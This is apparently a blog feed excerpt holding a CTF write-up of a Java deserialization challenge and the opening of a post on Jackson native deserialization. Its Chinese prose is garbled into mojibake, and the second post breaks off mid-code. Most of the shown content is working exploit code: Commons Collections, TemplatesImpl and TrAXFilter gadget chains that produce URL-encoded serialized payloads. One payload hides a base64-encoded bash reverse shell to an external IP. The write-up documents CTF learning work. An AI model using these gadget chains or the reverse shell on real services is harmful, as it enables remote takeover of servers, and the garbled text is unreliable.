è§¦å‘æ¶æ„ç±»<br></code></pre></td></tr></table></figure><h2 id="å¼€å§‹å‡ºé”™"><a href="#å¼€å§‹å‡ºé”™" class="headerlink" title="å¼€å§‹å‡ºé”™"></a>å¼€å§‹å‡ºé”™</h2><p>ç¬¬ä¸€æ¬¡è‡ªå·±å†™æˆ‘æ˜¯æƒ³ç›´æ¥å°†æ¶æ„ç±»æ”¾åˆ°Myexpectä¸Šæ¥è§¦å‘çš„ï¼Œä½†æ˜¯ä»–å¹¶ä¸è¡Œï¼Œåæ¥å‘ç°æ˜¯æˆ‘javassistå†™é”™äº†</p><p>ç¬¬ä¸€æ¬¡exp(ä½†æ˜¯è¿œç¨‹ä¸é€šï¼Œå…¶å®æœ¬åœ°ä¹Ÿé€šä¸äº†ğŸ˜…)</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> clazz.toClass();<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        setValue(myexpect,<span class="hljs-string">&quot;targetclass&quot;</span>,aClass); <span class="hljs-comment">//è®¾ç½®targetClassä¸ºæ¶æ„ç±»</span><br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5éƒ¨åˆ†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;aaa&quot;</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹valå±æ€§</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//ç”Ÿæˆbase64åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//ä¸€å®šè¦è®°å¾—urlç¼–ç ä¸ç„¶æ‰“ä¸é€š</span><br><br><span class="hljs-comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArray);</span><br><span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">//        objectInputStream.readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±é‡ä¸Šä¸€ä¸ªéå¸¸å¥‡æ€ªçš„é—®é¢˜äº†ï¼Œä»–ç°åœ¨åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼¹è®¡ç®—å™¨ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¸ä¼šï¼Œä½†æ˜¯å½“æˆ‘åœ¨æœ¬åœ°æŠŠåºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²æ‹¿å‡ºæ¥ååºåˆ—åŒ–çš„æ—¶å€™ä»–åˆèƒ½å¼¹äº†å†å½“æˆ‘å»æ‰“è¿œç¨‹çš„æ—¶å€™ä»–æ‰“ä¸é€šï¼Œåªå›æ˜¾ä¸€ä¸ª</p><p><img src="https://cdn.clown2024.cn/202410151636267.png" alt="image-20241015163624227"></p><p>åæ¥åˆå‘ç°ä¸Šé¢çš„çš„lazyMapä¹Ÿå†™é”™äº†ï¼Œåº”è¯¥æ˜¯è¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Map lazyMap = LazyMap.decorate(jsonObject, new ConstantTransformer(myexpect));<br></code></pre></td></tr></table></figure><p>å› ä¸ºè¿™æ ·æ‰èƒ½ä¿è¯æˆ‘ä»¬putè¿›å»çš„valueæ˜¯Myexpectç±»ï¼Œå› ä¸º<strong>ConstantTransformer</strong>è¿™ä¸ªç±»çš„transformè¿”å›çš„å°±æ˜¯æœ¬èº«ï¼ˆå¤ªä¹…æ²¡çœ‹ccé“¾æœ‰ç‚¹å¿˜äº†</p><p>ä½†è¿˜æ˜¯é€šä¸äº†ï¼Œä¼šç»™æˆ‘æŠ¥é”™ClassNotFoundçš„é”™è¯¯</p><p>æˆ‘ååˆ†åœ°ä¸ç†è§£ï¼Œç†è®ºä¸ŠMyexpectèƒ½åœ¨ååºåˆ—åŒ–æ‰§è¡ŒnewInstanceï¼Œé‚£æˆ‘ç›´æ¥æ‰§è¡Œæ¶æ„ç±»çš„newInstanceä¸å°±å¥½äº†ï¼Œå¹¶ä¸éœ€è¦å»å†æ‰“cc3åé¢ä¸€æ•´ä¸ªéƒ¨åˆ†ï¼Œä½†æ˜¯ä»–å°±æ˜¯ä¸è¡Œï¼Œæˆ‘ä¹Ÿæ²¡æ‰¾å‡ºæ¥é—®é¢˜åœ¨å“ª</p><h2 id="æ‰¾åˆ°åŸå› "><a href="#æ‰¾åˆ°åŸå› " class="headerlink" title="æ‰¾åˆ°åŸå› "></a>æ‰¾åˆ°åŸå› </h2><p>å“¦caoè°ƒäº†åŠå¤©ï¼Œæˆ‘å»çœ‹äº†ä¸€ä¸‹è°ƒç”¨æ ˆç»ˆäºå‘ç°é—®é¢˜äº†</p><p><img src="https://cdn.clown2024.cn/202410151636181.png" alt="image-20241015163634114"></p><p><img src="https://cdn.clown2024.cn/202410151636869.png" alt="image-20241015163641816"></p><p><img src="https://cdn.clown2024.cn/202410151636685.png" alt="image-20241015163650638"></p><p>è¿˜æ˜¯åŸºç¡€ä¸ç‰¢çš„åŸå› å•ŠğŸ˜­</p><p>ä¸‹é¢æ ¹æ®ä¸Šé¢çš„å›¾è¯´ä¸€ä¸‹æˆ‘è‡ªå·±çš„ç†è§£ï¼Œå¯¹javaç±»åŠ è½½åˆæ¸…æ™°äº†ä¸€äº›</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é¦–å…ˆæ‰§è¡ŒnewInstanceçš„è¯éœ€è¦èµ°æ•´ä¸ªç±»åŠ è½½çš„æµç¨‹<br>ç„¶åä¼šå…ˆå»æ‰¾å…¨ç±»å<br>å› ä¸ºæ²¡æœ‰è¿™ä¸ªç±»æ‰€ä»¥åœ¨ClassForNameé€”ä¸­å°±ä¼šæŠ¥é”™<br>è€ŒdefineClassç›´æ¥ä»å­—èŠ‚ç å‘jvmæ³¨å†Œè¿™ä¸ªç±»ç›´æ¥è·³è¿‡äº†å‰é¢çš„æ­¥éª¤<br>æ‰€ä»¥è¦æ‰§è¡ŒTemplatesImplçš„defineClassæ‰è¡Œ<br></code></pre></td></tr></table></figure><p>ä¸‹é¢å†™ä¸€ä¸‹èƒ½é€šçš„expå§ï¼Œå°±æ˜¯å°è£…TrAXFilteræ¥æ‰“TemplatesImpl</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTA3LjIxMy84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templates &#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5éƒ¨åˆ†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹valå±æ€§</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//ç”Ÿæˆbase64åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//ä¸€å®šè¦è®°å¾—urlç¼–ç ä¸ç„¶æ‰“ä¸é€š</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410151637073.png" alt="image-20241015163705024"></p><p><img src="https://cdn.clown2024.cn/202410151637818.png" alt="image-20241015163713767"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è™½è¯´é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯ç”±äºjavaé¢˜ç›®åšçš„è¿˜ä¸æ˜¯å¾ˆå¤šä¸å¤ªç†Ÿæ‚‰ï¼Œè€Œä¸”javaåŸºç¡€ä¸ç‰¢ï¼Œå¯¼è‡´ä¸€äº›ç‚¹è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;h1 id=&quot;deserbugé¢˜ç›®&quot;&gt;&lt;a href=&quot;#DeserBugé¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;Des</summary>
      
    
    
    
    <category term="true" scheme="https://clowsman.github.io/categories/true/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>JacksonåŸç”Ÿååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-12T13:58:39.000Z</published>
    <updated>2024-10-13T16:36:08.900Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&u_asig=1a0c381017287414696367848e00f7">https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7</a></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Jacksonçš„åŸç”Ÿååºåˆ—åŒ–ä¸»è¦æ˜¯ä¸ºäº†è§¦å‘ä»»æ„getteræ–¹æ³•è°ƒç”¨é“¾å­ï¼Œç±»ä¼¼fastjsonåŸç”Ÿååºåˆ—åŒ–è§¦å‘getteré‚£æ ·</p><h1 id="getterè§¦å‘æµç¨‹"><a href="#getterè§¦å‘æµç¨‹" class="headerlink" title="getterè§¦å‘æµç¨‹"></a>getterè§¦å‘æµç¨‹</h1><p>æ—¢ç„¶è¦è°ƒç”¨ä»»æ„getteræ–¹æ³•ï¼Œé‚£æˆ‘ä»¬å°±è¦è§¦å‘getteræ–¹æ³•çš„æµç¨‹</p><p>Jacksonè§¦å‘getteræ˜¯åœ¨<strong>ObjectMapper#writeValueAsString</strong>æ–¹æ³•æ‰§è¡Œçš„æ—¶å€™</p><p>æ‰“ä¸ªæ–­ç‚¹è·Ÿè¸ªä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410130102864.png" alt="image-20241013010248819"></p><p>è¿™é‡Œè¯´å‡ ä¸ªå…³é”®æ–¹æ³•</p><p>å…ˆèµ°åˆ°DefaultSerializerProvider#serializeValueæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130106024.png" alt="image-20241013010627975"></p><p>è¿™é‡Œè·å–ä¸€ä¸ªåºåˆ—åŒ–å™¨ï¼Œæˆ‘ä»¬ä¼ å…¥äº†POJOå¯¹è±¡ï¼Œæ‰€ä»¥è¿”å›ä¸€ä¸ªBeanSerializer</p><p>ç„¶åå»åˆ°BeanSerializer#serializeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130110595.png" alt="image-20241013011008553"></p><p>writeStartObjectå’ŒwriteEndObjectå°±æ˜¯åˆ†åˆ«åœ¨é¦–å°¾å†™ä¸Šâ€™{â€˜å’Œâ€™}â€™</p><p>è°ƒç”¨getteræ–¹æ³•å°±åœ¨serializeFieldsæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410130112193.png" alt="image-20241013011227152"></p><p>åœ¨serializeAsFieldæ–¹æ³•é‡Œé¢è¿™ä¸ªåœ°æ–¹è°ƒç”¨äº†getteræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130117833.png" alt="image-20241013011745786"></p><h2 id="pojonode"><a href="#POJONode" class="headerlink" title="POJONode"></a>POJONode</h2><p>å‰é¢è¯´çš„éƒ½æ˜¯åºåˆ—åŒ–çš„getterï¼Œå’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œåœ¨Jacksonçš„åŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œåˆ©ç”¨çš„æ˜¯POJONodeçš„toStringæ–¹æ³•æ¥è§¦å‘å¯¹åº”ç±»å¯¹è±¡çš„getteræ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹</p><blockquote><p>è¿™é‡Œæµ‹å¾—æ—¶å€™å‘ç°ç¦»è°±çš„åœ°æ–¹ï¼Œæµ‹è¯•å‡ºæ¥Jacksonåº”è¯¥æ˜¯åœ¨2.10.xæ‰æŠŠtoStringå»æ‰æ”¹åˆ°çˆ¶ç±»å»çš„ï¼Œåœ¨2.9.xä»¥åŠä¹‹å‰ï¼ŒPOJONodeè‡ªå·±æœ¬èº«æ˜¯æœ‰toStringæ–¹æ³•çš„ï¼Œè€Œä»–çš„çˆ¶ç±»BaseJsonNodeåè€Œæ˜¯æ²¡æœ‰å®ç°toStringçš„ï¼Œè¿™æ ·å°±ä¸èƒ½è¿›è¡Œåˆ©ç”¨äº†</p><p><img src="https://cdn.clown2024.cn/202410131258198.png" alt="image-20241013125810157"></p></blockquote><p>ä»–POJONodeæœ¬èº«æ˜¯æ²¡æœ‰toStringçš„ï¼Œæ˜¯åˆ°çˆ¶ç±»BaseJsonNodeæ‰æœ‰å®ç°ï¼Œç»§æ‰¿å…³ç³»å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">POJONode --&gt; ValueNode --&gt; BaseJsonNode<br></code></pre></td></tr></table></figure><p>BaseJsonNode#toString</p><p><img src="https://cdn.clown2024.cn/202410130142098.png" alt="image-20241013014250059"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªInternalNodeMapper.nodeToStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130143214.png" alt="image-20241013014346177"></p><p>æ¬¸æ˜¯ä¸æ˜¯çœ‹åˆ°äº†ä¸€ä¸ªç†Ÿæ‚‰çš„ä¸œè¥¿ï¼ŒwriteValueAsStringï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯è§¦å‘getteræ–¹æ³•çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯æ¼æ´è§¦å‘ç‚¹</p><p>æ‰€ä»¥è°ƒç”¨é“¾å°±æ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>èƒ½è°ƒç”¨getteræ–¹æ³•å°±å¯ä»¥æ‰“é“¾å­äº†</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è§¦å‘toStringè‡ªç„¶å°±é€‰æ‹©æˆ‘ä»¬å¸¸ç”¨çš„BadAttributeValueExpExceptionäº†</p><p>é“¾å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject -&gt; POJONode#toString -&gt; BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        